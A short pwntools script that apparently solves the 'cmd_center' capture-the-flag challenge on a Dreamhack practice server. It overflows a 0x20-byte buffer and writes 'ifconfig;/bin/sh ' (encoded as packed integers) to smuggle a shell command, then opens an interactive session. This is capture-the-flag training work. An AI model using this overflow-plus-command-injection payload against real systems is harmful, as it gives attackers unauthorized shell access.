from pwn import *

exe = ELF('./cmd_center', checksec = False)

# p = process(exe.path)
p = remote('host8.dreamhack.games', 16035)

# input()
system = 2335243054344659503
ifconfig = 7451599682962417257
payload = b'a'*0x20
payload += p64(ifconfig)
payload += b';'
payload += p64(system)
p.sendlineafter(b"Center name: ", payload)

p.interactive()